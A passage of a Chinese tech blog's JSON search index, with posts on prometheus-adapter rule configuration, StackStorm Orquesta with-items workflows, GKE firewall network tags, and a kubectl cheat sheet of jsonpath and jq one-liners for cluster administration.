/api/v1/series)。适配器将从这些系列中剥离标签值，然后在后续步骤中使用得到的“指标名称—标签名称”的组合。\n在许多情况下，seriesQuery 就足以缩小 Prometheus series 的列表。但有时(特别是当两个规则可能重叠时)，对指标名称进行额外的过滤是很有用的。在这种情况下,可以使用 seriesFilters。在从 seriesQuery 返回 series 列表后，每个 series 的指标名称都会通过指定的任何过滤器进行过滤。\n过滤器可以是以下两种形式之一:\nis: ，匹配名称符合指定正则表达式的任何序列。 isNot: ，匹配名称不符合指定正则表达式的任何序列。 例如\n# match all cAdvisor metrics that aren't measured in seconds seriesQuery: '{__name__=~\u0026quot;^container_.*_total\u0026quot;,container!=\u0026quot;POD\u0026quot;,namespace!=\u0026quot;\u0026quot;,pod!=\u0026quot;\u0026quot;}' seriesFilters: - isNot: \u0026quot;^container_.*_seconds_total\u0026quot; Association Association 部分控制了确定序列指标可以附加到哪些 Kubernetes 资源的过程。resources 字段控制了这个过程。\n有两种方式来关联资源与特定指标。在这两种情况下,标签的值都会成为特定对象的名称。\n一种方式是指定，任何符合某个特定模式的标签名称都指向基于标签名称的某个“group_resource”。这可以使用 template 字段来完成。pattern 被指定为一个 Go 模板，其中 Group 和 Resource 字段分别代表“组”和“资源”。\n# any label `kube_\u0026lt;group\u0026gt;_\u0026lt;resource\u0026gt;` becomes \u0026lt;group\u0026gt;.\u0026lt;resource\u0026gt; in Kubernetes resources: template: \u0026quot;kube_\u0026lt;\u0026lt;.Group\u0026gt;\u0026gt;_\u0026lt;\u0026lt;.Resource\u0026gt;\u0026gt;\u0026quot; 另一种方式是指定某个特定标签代表某个特定的 Kubernetes 资源。这可以使用 overrides 字段来完成。每个 override 将一个 Prometheus 标签映射到一个 Kubernetes group-resource。例如:\n# the microservice label corresponds to the apps.deployment resource resources: overrides: microservice: group: \u0026quot;apps\u0026quot; resource: \u0026quot;deployment\u0026quot; Association 部分提供了两种关联 Prometheus 指标和 Kubernetes 资源的方式，可以根据需要灵活地组合使用。这是实现自定义指标 API 的关键一环。\nNaming Naming 部分控制了将 Prometheus 指标名称转换为自定义指标 API 中的指标，这是通过 name 字段来实现的。\nNaming 的控制通过指定一个从 Prometheus 名称中提取 API 名称的模式，以及对提取值进行的可选转换来实现。\n模式由 matches 字段指定，这是一个正则表达式。如果没有指定,它默认为 .* 。\n转换由 as 字段指定。你可以使用 matches 字段中定义的任何捕获组。如果 matches 字段没有捕获组，as 字段默认为 $0 。如果只包含一个捕获组，as 字段默认为 $1 。否则，如果没有指定 as 字段就会出错。例如\n# match turn any name \u0026lt;name\u0026gt;_total to \u0026lt;name\u0026gt;_per_second # e.g. http_requests_total becomes http_requests_per_second name: matches: \u0026quot;^(.*)_total$\u0026quot; as: \u0026quot;${1}_per_second\u0026quot; Querying Querying 部分控制了实际获取特定指标值的过程。它由 metricsQuery 字段来控制。\nmetricsQuery 字段是一个 Go 模板,它会被转换成一个 Prometheus 查询，使用从特定的自定义指标 API 调用获取的输入数据。对自定义指标 API 的一次调用会被简化为一个指标名称、一个 “group-resource” 和一个或多个该 “group-resource” 的对象。这些会被转换成模板中的以下字段:\nSeries: 指标名称 LabelMatchers: 一个逗号分隔的标签匹配器列表，匹配给定的对象。当前包括特定的 “group-resource” 标签，以及 namespace 标。 GroupBy: 一个逗号分隔的用于分组的标签列表。当前包括用于 LabelMatchers 的组-资源标签。 例如，假设我们有一个 http_requests_total 序列 (在 API 中公开为 http_requests_per_second )，具有 service、pod、ingress、namespace 和 verb 标签。前四个对应于 Kubernetes 资源。那么,如果有人请求了 pods/http_request_per_second 指标，那么针对 somens 命名空间中的 pod1 和 pod2，我们会有:\nSeries: \u0026ldquo;http_requests_total\u0026rdquo; LabelMatchers: \u0026quot;pod=~\u0026quot;pod1|pod2\u0026quot;,namespace=\u0026quot;somens\u0026quot;\u0026quot; GroupBy: pod 对应 prometheus promql 如下所示\nsum(http_requests_total{pod=~\u0026quot;pod1|pod2\u0026quot;,namespace=\u0026quot;somens\u0026quot;}) by (pod) 此外,还有两个高级字段是其他字段的\u0026quot;原始\u0026quot;形式:\nLabelValuesByName: 映射。将 LabelMatchers 字段中的标签和值对应起来。值是用 | 预先连接的 (用于在 Prometheus 中使用 =~ 匹配器)。 GroupBySlice: GroupBy 字段的切片形式。 通常，我们可能会想使用 Series、LabelMatchers 和 GroupBy 字段。其他两个是用于高级用法的。\nQuerying 预计会为每个请求的对象返回一个值。适配器会使用返回的系列上的标签，将给定的系列关联回其相应的对象。例如:\n# convert cumulative cAdvisor metrics into rates calculated over 2 minutes metricsQuery: \u0026quot;sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container!=\u0026quot;POD\u0026quot;}[2m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)\u0026quot; 完整的配置文件实例 例如，我们想使用 springboot 的 actuator 提供的 jvm_memory_used_bytes 和 jvm_memory_max_bytes 计算内存使用率，如下所式\nrules: - seriesQuery: 'jvm_memory_used_bytes' resources: overrides: namespace: resource: \u0026quot;namespace\u0026quot; pod: resource: \u0026quot;pod\u0026quot; name: matches: 'jvm_memory_used_bytes' as: memory_percent metricsQuery: 'sum(jvm_memory_used_bytes{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) / sum(jvm_memory_max_bytes{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) * 100' - seriesQuery: 'process_cpu_usage' resources: overrides: namespace: resource: \u0026quot;namespace\u0026quot; pod: resource: \u0026quot;pod\u0026quot; name: matches: 'process_cpu_usage' as: process_cpu_percent metricsQuery: 'sum(avg_over_time(process_cpu_usage{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[1m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)' 这里用到了一个技巧，就是使用查询多个指标，这里参考了 prometheus-adapter 的说明 4\n这很好理解,虽然一开始可能看起来不太明显。\n基本上，你只需要选择一个指标作为 \u0026ldquo;Discovery\u0026rdquo; 和 \u0026ldquo;naming\u0026rdquo; 指标，然后使用它来配置配置中的 \u0026ldquo;discovery\u0026rdquo; 和 \u0026ldquo;naming\u0026rdquo; 部分。之后，你就可以在 metricsQuery 中写任何你想要的指标了！ ==Querying 的序列可以包含任何你想要的指标，只要它们有正确的标签集合即可==。\n例如，假设你有两个指标 foo_total 和 foo_count，它们都有一个标签 system_name，用于表示节点资源，那么如下配置所示\nrules: - seriesQuery: 'foo_total' resources: {overrides: {system_name: {resource: \u0026quot;node\u0026quot;}}} name: matches: 'foo_total' as: 'foo' metricsQuery: 'sum(foo_total{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) / sum(foo_count{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;)' 由于我们使用了 jvm_memory_used_bytes 和 jvm_memory_max_bytes ，那么我们可以在 \u0026ldquo;discovery\u0026rdquo; 和 \u0026ldquo;naming\u0026rdquo; 部分写任意指标，在 ”quering“ 中使用真是的指标进行替换，就可以完成\n查询 kubernetes 的指标 完成配置后，可以使用下面命令进行查询\nkubectl get --raw \u0026quot;/apis/custom.metrics.k8s.io/v1beta1\u0026quot;|jq { \u0026quot;kind\u0026quot;: \u0026quot;APIResourceList\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;, \u0026quot;groupVersion\u0026quot;: \u0026quot;custom.metrics.k8s.io/v1beta1\u0026quot;, \u0026quot;resources\u0026quot;: [ { \u0026quot;name\u0026quot;: \u0026quot;pods/process_cpu_percent\u0026quot;, \u0026quot;singularName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;namespaced\u0026quot;: true, \u0026quot;kind\u0026quot;: \u0026quot;MetricValueList\u0026quot;, \u0026quot;verbs\u0026quot;: [ \u0026quot;get\u0026quot; ] }, { \u0026quot;name\u0026quot;: \u0026quot;pods/memory_percent\u0026quot;, \u0026quot;singularName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;namespaced\u0026quot;: true, \u0026quot;kind\u0026quot;: \u0026quot;MetricValueList\u0026quot;, \u0026quot;verbs\u0026quot;: [ \u0026quot;get\u0026quot; ] }, { \u0026quot;name\u0026quot;: \u0026quot;namespaces/memory_percent\u0026quot;, \u0026quot;singularName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;namespaced\u0026quot;: false, \u0026quot;kind\u0026quot;: \u0026quot;MetricValueList\u0026quot;, \u0026quot;verbs\u0026quot;: [ \u0026quot;get\u0026quot; ] }, { \u0026quot;name\u0026quot;: \u0026quot;namespaces/process_cpu_percent\u0026quot;, \u0026quot;singularName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;namespaced\u0026quot;: false, \u0026quot;kind\u0026quot;: \u0026quot;MetricValueList\u0026quot;, \u0026quot;verbs\u0026quot;: [ \u0026quot;get\u0026quot; ] } ] } 可以通过 custom API 进程查询具体获取的值，如下所示\n$ kubectl get --raw \u0026quot;/apis/custom.metrics.k8s.io/v1beta1/namespaces/public/pods/*/process_cpu_percent\u0026quot;|jq { \u0026quot;kind\u0026quot;: \u0026quot;MetricValueList\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;custom.metrics.k8s.io/v1beta1\u0026quot;, \u0026quot;metadata\u0026quot;: {}, \u0026quot;items\u0026quot;: [ { \u0026quot;describedObject\u0026quot;: { \u0026quot;kind\u0026quot;: \u0026quot;Pod\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;msg\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;message-gateway-api-78c4d5cdbf-9k2g7\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;/v1\u0026quot; }, \u0026quot;metricName\u0026quot;: \u0026quot;process_cpu_percent\u0026quot;, \u0026quot;timestamp\u0026quot;: \u0026quot;2024-05-31T11:40:25Z\u0026quot;, \u0026quot;value\u0026quot;: \u0026quot;404m\u0026quot;, \u0026quot;selector\u0026quot;: null }, ... { \u0026quot;describedObject\u0026quot;: { \u0026quot;kind\u0026quot;: \u0026quot;Pod\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;msg\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;message-core-79fdc6fdd-lkpdm\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;/v1\u0026quot; }, \u0026quot;metricName\u0026quot;: \u0026quot;process_cpu_percent\u0026quot;, \u0026quot;timestamp\u0026quot;: \u0026quot;2024-05-31T11:40:25Z\u0026quot;, \u0026quot;value\u0026quot;: \u0026quot;31m\u0026quot;, \u0026quot;selector\u0026quot;: null }, { \u0026quot;describedObject\u0026quot;: { \u0026quot;kind\u0026quot;: \u0026quot;Pod\u0026quot;, \u0026quot;namespace\u0026quot;: \u0026quot;msg\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;message-push-admin-554f5d96fd-xlnhj\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;/v1\u0026quot; }, \u0026quot;metricName\u0026quot;: \u0026quot;process_cpu_percent\u0026quot;, \u0026quot;timestamp\u0026quot;: \u0026quot;2024-05-31T11:40:25Z\u0026quot;, \u0026quot;value\u0026quot;: \u0026quot;487m\u0026quot;, \u0026quot;selector\u0026quot;: null } ] } 我们可以看到，返回值是带有 ”m“ 的单位，这里 issue 是这样回答的\nThe m-suffix means milli, Quantity Values are explained here: https://github.com/kubernetes-sigs/prometheus-adapter/blob/master/docs/walkthrough.md#quantity-values 5\n在指标 API 中最常见的是 m 后缀,它表示毫单位，即单位的千分之一；由于我们返回值是一个百分比，例如 4.87%，那么实际值是 0.0487，那么他的毫单位为就是 “487m” ，和上面返回值一样。\nPrometheus-adapter的安装 在这里采用 helm 方式进行安装，只需要修改对应参数即可\nhelm install prometheus-adapter -n monitoring prometheus-community/prometheus-adapter \\ --set prometheus.url=http://prometheus.default.svc \\ --set logLevel=2 \\ --set rules.external=xxx # 如果使用外部规则替换默认的config.yaml,则需要提前创建一个configmap，然后这里指定这个名称 Reference [1] Kubernetes monitoring architecture\n[2] core-metrics-pipeline\n[3] kubernetes/metrics\n[4] my-query-contains-multiple-metrics-how-do-i-make-that-work\n[5] why i request rest-api, returned requeslt for item value has \u0026rsquo;m\u0026rsquo; unit!! #376\n[6] Guide to Kubernetes Metrics\n[7] Kubernetes 监控架构(译)\n","permalink":"https://www.oomkill.com/2024/05/prometheus-adapter-intro/","summary":"","title":"深入解析Kubernetes监控体系与prometheus-adapter"},{"content":"工作流模型是指 Stackstorm 中 Orquesta 工作流的定义，包含工作流的执行方式，也可以理解为工作流模型就是 Workflow DSL 定义任务执行的有向图\n工作流模型 下表是工作流模型 (Workflow Model) 的属性。工作流接受 Input，按预定义顺序执行一组任务 (Task)，并返回输出 (Output)。此处的工作流模型是一个有向图 (directed graph)，其中 Task 是节点，Taskt 之间的转换及其条件形成边。组成工作流的任务将在 DSL 中定义为名为 Task 的字典， 其中 Key 和 Value 分别是任务名称和任务模型。\nAttribute Required Description version Yes The version of the spec being used in this workflow DSL. description No The description of the workflow. input No A list of input arguments for this workflow. vars No A list of variables defined for the scope of this workflow. tasks Yes A dictionary of tasks that defines the intent of this workflow. output No A list of variables defined as output for the workflow. 下面示例是一个 Workflow 的 DSL 定义，说明基础的工作流模型中各个部分的组成\nversion: 1.0 description: A simple workflow. # 字符串列表，假设将在运行时提供值或键值对，其中当运行时未提供值时，值使用默认值。 # 这些属性的定义在 Action 的元数据文件中定义，包含默认值 input: - arg1 - arg2: abc # 一组键值对的变量，可以用于存储数据 vars: - var1: 123 - var2: True - var3: null # 由字典组成任务定义，执行任务顺序由入栈任务转换和出栈条件组成 tasks: # 定义两个任务，next为下一个执行的任务 task1: action: core.noop next: - do: task2 task2: action: core.noop # 要输出的键值对列表 output: - var3: \u0026lt;% ctx().arg1 %\u0026gt; - var4: var41: 456 var42: def - var5: - 1.0 - 2.0 - 3.0 with-item 模型 with-item 模型 是workflow 批量处理任务的一种方式，with-item 将遍历每个 item，然后作为参数传给 Action，默认情况下，所有 Item 将同时处理。当配置 concurrency 指定时，将处理最多 concurrency 值的 item 数，其余项目将排队等待执行，当 Item 的 Action 执行完成后，将处理列表中的下一个item。\n任务结果是按照与item相同的顺序排列的Action执行结果的列表。所有Action执行必须成功完成，任务才能达到成功状态。如果一个或多个Action执行失败，则该任务将为失败状态。\n当有取消或暂停工作流的请求时，任务将分别处于取消或暂停状态，直到执行过程中的所有Action执行完成。一旦这些Action执行完成时，任务将分别进入取消或暂停状态。如果指定了任务的 concurrency 并且还有剩余item，则不会请求新的 Action 执行。当暂停的工作流程恢复时，任务将继续处理剩余的 Item。\nItem 可配置参数如下：\nAttribute Required Description items Yes The list of items to execute the action with. concurrency No The number of items being processed concurrently. 一个简单的with-item 模型示例 以下是一个简单示例，其中包含任务中定义的单个 Item 列表。该任务会收到一个要回显的消息列表。对于不需要并发的项目 Item，有一个速记符号可以将列表直接传递给 with 语句。可以使用 item 函数将各个项目作为输入传递到 Action 中以供执行。\nversion: 1.0 input: - messages tasks: task1: with: \u0026lt;% ctx(messages) %\u0026gt; action: core.echo message=\u0026lt;% item() %\u0026gt; 当需要并发执行时，使用 with-items 的 schema 去定义 ，如下所示\nversion: 1.0 input: - messages tasks: task1: with: items: \u0026lt;% ctx(messages) %\u0026gt; concurrency: 2 action: core.echo message=\u0026lt;% item() %\u0026gt; 进阶：为Item命名 Item 也可以被命名，下面示例时和上面相同功能的 workflow，但他为 items 使用 “message” 的作为名称进行标注。在标记时，指定了 message in \u0026lt;% ctx(messages) %\u0026gt; 进行命名，这里 item 被指定为 “message”，在引用时，item 函数也必须指定名称 item(message)，这种场景返回的就不是列表，而是一个字典，类似 {\u0026quot;message\u0026quot;: \u0026quot;value\u0026quot;} 在处理多个项目时比较有用。\nversion: 1.0 input: - messages tasks: task1: with: message in \u0026lt;% ctx(messages) %\u0026gt; action: core.echo message=\u0026lt;% item(message) %\u0026gt; 为多个Item命名 在执行 Action 时，可以将多个 Item 作为 input 传入到 Action中，这里就利用到 item 命名的方式与另外 stackstrom 提供的 zip 函数。zip 与 python zip 相同，将多个元组进行迭代，然后将他们（多个元组相同下标项）的每项压缩为一个元组。\n个元组进行迭代，然后将他们的每项压缩为一个元组。 version: 1.0 input: - hosts - commands tasks: task1: with: host, command in \u0026lt;% zip(ctx(hosts), ctx(commands)) %\u0026gt; action: core.remote hosts=\u0026lt;% item(host) %\u0026gt; cmd=\u0026lt;% item(command) %\u0026gt; 上面示例为，input 有两个列表，hosts 和 commands，这里使用 zip 压缩后将便成为 ，({hosts:xxx}, {commands:xxx}) 这样在执行时通过 item 函数指定名称 item(host)，就可以获取到对应的迭代器位的 host，通过这样的方式来进行多列表参数的传入。\n下面是一个多参数 with-item 模型的执行示例\nversion: 1.0 description: A workflow demonstrating with items. input: - members - test tasks: task1: with: host, command in \u0026lt;% zip(ctx(members), ctx(test)) %\u0026gt; action: core.echo message=\u0026quot;\u0026lt;% item() %\u0026gt;, resistance is futile!\u0026quot; output: - items: \u0026lt;% task(task1).result.items.select($.result.stdout) %\u0026gt; 通过执行结果可以看出 multiple-Item 的机制\nst2 execution get 664dd003169d72f36729cb70 id: 664dd003169d72f36729cb70 action.ref: frist.orquesta-with-items parameters: None status: succeeded (1s elapsed) start_timestamp: Wed, 22 May 2024 10:59:15 UTC end_timestamp: Wed, 22 May 2024 10:59:16 UTC log: - status: requested timestamp: '2024-05-22T10:59:15.698000Z' - status: scheduled timestamp: '2024-05-22T10:59:15.813000Z' - status: running timestamp: '2024-05-22T10:59:15.865000Z' - status: succeeded timestamp: '2024-05-22T10:59:16.918000Z' result: output: items: - '{''host'': ''Lakshmi'', ''command'': ''t1''}, resistance is futile!' - '{''host'': ''Lindsay'', ''command'': ''t2''}, resistance is futile!' - '{''host'': ''Tomaz'', ''command'': ''t3''}, resistance is futile!' +--------------------------+------------------------+-------+-----------+------------------------------+ | id | status | task | action | start_timestamp | +--------------------------+------------------------+-------+-----------+------------------------------+ | 664dd004ed940d64824e33fb | succeeded (0s elapsed) | task1 | core.echo | Wed, 22 May 2024 10:59:16 UTC| | 664dd004ed940d64824e33fe | succeeded (0s elapsed) | task1 | core.echo | Wed, 22 May 2024 10:59:16 UTC| | 664dd004ed940d64824e3402 | succeeded (0s elapsed) | task1 | core.echo | Wed, 22 May 2024 10:59:16 UTC| +--------------------------+------------------------+-------+-----------+------------------------------+ Reference [1] Sensors and Triggers\n[2] How many do you need? - Argo CD Architectures Explained\n","permalink":"https://www.oomkill.com/2024/05/stackstorm-sensors/","summary":"","title":"StackStorm自动化 - 工作流模型"},{"content":"GKE添加VPC防火墙规则有与GCE有一些区别，必须找到GKE的”网络标记“才可以，如下\n选择 Kubernetes Engine =\u0026gt; 选择 ”集群“ 进入 GKE 集群主页\n随便选择一个集群，进入集群详细页面\n选择集群中的任意一个节点池\n找到节点池中任意一个节点，点击进入\n进入后向下拉找到”网络标记“部分，这个网络标记可以标记这个集群的所有节点\n如果想自定义”网络标记“的名称，可以在集群首页选择标记进行修改\n","permalink":"https://www.oomkill.com/2024/05/gke-firewall/","summary":"","title":"GKE - 为GKE集群增加VPC防火墙规则"},{"content":"Pod 检查 Pod 就绪探针\nkubectl get pods \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -o jsonpath='{.status.conditions[?(@.type==\u0026quot;Ready\u0026quot;)].status}'\r查看 Pod 事件\nkubectl get events -n \u0026lt;namespace\u0026gt; --field-selector involvedObject.name=\u0026lt;pod-name\u0026gt;\r获取 Pod Affinity 和 Anti-Affinity\nkubectl get pod \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -o=jsonpath='{.spec.affinity}'\r列出 Pod 的 anti-affinity 规则\nkubectl get pod \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -o=jsonpath='{.spec.affinity.podAntiAffinity}'\rPod Network 运行 Debug Pod 进行调试\nkubectl run -it --rm --restart=Never --image=busybox net-debug-pod -- /bin/sh\r测试从 Pod 到 Endpoint 的连接性\nkubectl exec -it \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -- curl \u0026lt;endpoint-url\u0026gt;\rtrace 一个 Pod 到另一个 Pod 的网络\nkubectl exec -it \u0026lt;source-pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -- traceroute \u0026lt;destination-pod-ip\u0026gt;\r检查 Pod DNS配置\nkubectl exec -it \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; -- cat /etc/resolv.conf\rDeployment 查看 rollout 状态\nkubectl rollout status deployment/\u0026lt;deployment-name\u0026gt; -n \u0026lt;namespace\u0026gt;\r查看 rollout 历史记录\nkubectl rollout history deployment/\u0026lt;deployment-name\u0026gt; -n \u0026lt;namespace\u0026gt;\r调整 deployment 数量\nkubectl scale deployment \u0026lt;deployment-name\u0026gt; --replicas=\u0026lt;replica-count\u0026gt; -n \u0026lt;namespace\u0026gt;\r设置 deployment 的自动缩放\nkubectl autoscale deployment \u0026lt;deployment-name\u0026gt; \\\r--min=\u0026lt;min-pods\u0026gt; \\\r--max=\u0026lt;max-pods\u0026gt; \\\r--cpu-percent=\u0026lt;cpu-percent\u0026gt; \\\r-n \u0026lt;namespace\u0026gt;\r检查 HAP 状态\nkubectl get hpa -n \u0026lt;namespace\u0026gt;\rNetworking 显示命名空间中 Pod 的 IP 地址：\nkubectl get pods -n \u0026lt;namespace -o custom-columns=POD:metadata.name,IP:status.podIP --no-headers\rNode 获取特定 Node 上运行的 Pod 列表\nkubectl get pods --field-selector spec.nodeName=\u0026lt;node-name\u0026gt; -n \u0026lt;namespace\u0026gt;\rkubectl get pod -n {ns} -o \\ jsonpath='{range $.items[?(@.spec.nodeName == \u0026quot;xxxx\u0026quot;)]}{.metadata.name}{\u0026quot;\\n\u0026quot;}'\r获取 Node 的 IP\nkubectl get pod -n {ns} -o \\ -o=jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\t\u0026quot;}{.status.addresses[0].address}{\u0026quot;\\n\u0026quot;}{end}'\r获取 Node 上 指定标签\nkubectl get nodes \\\r-o=jsonpath='{range .items[*]}{.metadata.name}{\u0026quot;\\t\u0026quot;}{.metadata.labels.\u0026lt;xxx\u0026gt;}{\u0026quot;\\n\u0026quot;}{end}'\r查找属于这个标签 Node 的数量\nkubectl get node -l xxx=xxxx --no-headers | wc -l\r查看node上所有的标签，json格式\nkubectl get node -o json | jq '.items[] | {name: .metadata.name, labels: .metadata.labels }' --compact-output | jq -r\r根据 NodeSelector 查询 application\nkubectl get deployment -A \\\r-o=jsonpath='{range .items[*]}{@.metadata.name}{\u0026quot;\\t\u0026quot;}{range @.spec.template.spec.nodeSelector}{.xxxx}{\u0026quot;\\n\u0026quot;}{end}{end}'\r根据条件列出 Node 1.17+\nkubectl get nodes -o \\\rcustom-columns=NODE:.metadata.name,READY:.status.conditions[?(@.type==\u0026quot;Ready\u0026quot;)].status -l 'node-role.kubernetes.io/worker=xxx'\r获取 Node 的操作系统信息\nkubectl get node \u0026lt;node-name\u0026gt; -o jsonpath='{.status.nodeInfo.osImage}'\r查询应用 (Deployment) 使用的 Node\nkubectl deployment -n {ns} -o \\\rjsonpath='{range $.item[*]}{\u0026quot;Deployment: \u0026quot;}{.metadata.name}{\u0026quot;\\n\u0026quot;}{\u0026quot;\\t\u0026quot;}{.spec.template.spec.nodeSelector.srv-grp}{\u0026quot;\\n\u0026quot;}{end}'\r仅获取 Node 的指定标签和 Pod 名称\nk get nodes -o \\\rjsonpath='{range .items[*]}{.metadata.labels.nodeSelector.xxxxx}{\u0026quot;\\t\u0026quot;}{.status.addresses[?(@.type==\u0026quot;InternalIP\u0026quot;)].address}{\u0026quot;\\n\u0026quot;}{end}'\r仅获取 Node IP\nk get nodes -o jsonpath='{.items[*].status.addresses[?(@.type==\u0026quot;InternalIP\u0026quot;)].address}'\r获取指定标签的 Node，并输出他的标签和 IP\nk get nodes -o \\\rjsonpath='{range .items[?(@.metadata.labels.xxxx==\u0026quot;xxxx\u0026quot;)]}{.metadata.labels.srv-grp}{\u0026quot;\\t\u0026quot;}{.status.addresses[?(@.type==\u0026quot;InternalIP\u0026quot;)].address}{\u0026quot;\\n\u0026quot;}{end}'\r获取指定 Role 的 Node 列表，只输出他的主机名\nk get node --all-namespaces \\\r-o=jsonpath='{range .items[?(@.metadata.labels.kubernetes.io/role==\u0026quot;xxxx\u0026quot;)]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'\r修改指定 Role 的 Node 的角色值 (jq)\n# 假设将 k8s role 为 aaa 的主机修改为 role=bbb\rfor n in `k get nodes -o json |jq -r '.items[] | select(.metadata.labels.\u0026quot;kubernetes.io/role\u0026quot; == \u0026quot;aaa\u0026quot;) | .metadata.name'`;\rdo k label node $n kubernetes.io/role=bbb --overwrite\rdone\r修改指定 Role 的 Node 的角色值 (jsonpath)\n# 假设将 k8s node 标签 xxx 为 aaa 的主机修改为 xxx=bbb\rfor n in `k get nodes -o jsonpath='{range .items[?(@.metadata.labels.xxx==\u0026quot;aaa\u0026quot;)]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'`;\\\rdo\rk label node $n xxx=bbb --overwrite\rdone\rResource Quotas 列出命名空间中的资源配额\nkubectl get resourcequotas -n \u0026lt;namespace\u0026gt;\r查看资源配额详情\nkubectl describe resourcequota \u0026lt;resource-quota-name\u0026gt; -n \u0026lt;namespace\u0026gt;\rVolumes 按容量排序的列出PV\nkubectl get pv --sort-by=.spec.capacity.storage\r检查 PV reclaim policy\nkubectl get pv \u0026lt;pv-name\u0026gt; -o=jsonpath='{.spec.persistentVolumeReclaimPolicy}'\rEphemeral Containers 1.18+\n运行一个 ephemeral debugging 容器\nkubectl debug -it \u0026lt;pod-name\u0026gt; -n \u0026lt;namespace\u0026gt; --image=\u0026lt;debug-image\u0026gt; -- /bin/sh\rPod Disruption Budget (PDB) 列出一个ns内的PDB\nkubectl get pdb -n \u0026lt;namespace\u0026gt;\rConfigMap 批量备份 configmap\nSecret 从一个 namespace 导出所有 secret 到另一个 namespace\nfor n in `kubectl get secret -n xxxx -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'`;do\rkubectl get secret -n xxxx $n -o yaml | \\\rsed -e '/resourceVersion:/d;/uid:/d; /selfLink:/d; /creationTimestamp:/d;' \\\r-e 's/namespace: \u0026lt;xxxxxx\u0026gt;/namespace: \u0026lt;xxxxx\u0026gt;/' \\\rkubectl create -f -\rdone\r查看证书是否过期\nns=xxx\rsecret_name=xxx\rkeywords=xxx\r_command=xxxx\ropenssl x509 -in \u0026lt;(\r${_command} get secret -n $ns $secret_name -ojson | \\\rjq --arg secret_key $(\r${_command} get secret -n ${ns} ${secret_name} -ojson | \\\rjq -r '.data | keys[]' | \\\rawk -v keywords=${keywords} '$0 ~ keywords { print }'\r) -r '.data | .[$secret_key]' | base64 -d\r) -text -noout | \\\rgrep -i \u0026quot;subject: \u0026quot;\r批量备份集群内指定secret命令\n# 指定域名的secret\rkeywords=xxx\r_command=xxxx\rfor ns in `${_command} get ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{\u0026quot;end\u0026quot;}'`\rdo\rfor secret_name in `${_command} get secret -n $ns -o json|jq -r '.items[] | select( .type == \u0026quot;kubernetes.io/tls\u0026quot;) | .metadata.name'`\rdo openssl x509 -in \u0026lt;(\r${_command} get secret -n ${ns} ${secret_name} -ojson | \\\rjq --arg secret_key $(\r${_command} get secret -n ${ns} ${secret_name} -ojson | jq -r '.data | keys[]' | \\\rawk '$0 ~ /crt/ { print }'\r) -r '.data|.[$secret_key]'|base64 -d\r) -text -noout | \\\rgrep -i \u0026quot;subject: \u0026quot;| \\\rawk -v ns=${ns} -v secret_name=${secret_name} -v cmd=${_command} -v kw=${keywords} \\\r'$0 ~ kw { system(\rcmd\u0026quot; get secret -n \u0026quot;ns\u0026quot; \u0026quot;secret_name\u0026quot; -oyaml \u0026gt; primetive/\u0026quot;ns\u0026quot;.\u0026quot;secret_name\u0026quot;.yaml\u0026quot;\r)}'\rdone\rdone\r查询 tls 签发域名，并进行替换\nkeywords=xxx\r_command=xxxx\rfor ns in `${_command} get ns -o jsonpath='range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{\u0026quot;end\u0026quot;}'\rdo\rfor secret_name in `${_command} get secret -n $ns -o json|jq -r '.items[] | select( .type == \u0026quot;kubernetes.io/tls\u0026quot;) | .metadta.name'`\rdo openssl x509 -n \u0026lt;(\r${_command} get secret -n ${ns} ${secret_name} -ojson | \\\rjq --arg secret_key $(${_command} get secret -n ${ns} ${secret_name} -ojson | \\\rjq -r '.data | .keys[]' | \\\rawk '$0 ~ /crt/ { print }' -r '.data|.[$secret_key]'|base64 -d\r) -text -noout | \\\rgrep -i \u0026quot;subject: \u0026quot;| \\\rawk -v ns=${ns} -v secret_name=${secret_name} -v commond=${_command}\\\r'$0 ~ ${keywords} { system(\rcommand\u0026quot; create secret tls -n \u0026quot;ns\u0026quot; \u0026quot;secret_name\u0026quot; --cert=ca.crt --key=key.key --dry-run -oyaml|command\u0026quot; replace -f -\u0026quot;\r)}'\rdone\rdone\r","permalink":"https://www.oomkill.com/2024/04/kubernetes-kubectl.md/","summary":"","title":"探索kubectl - 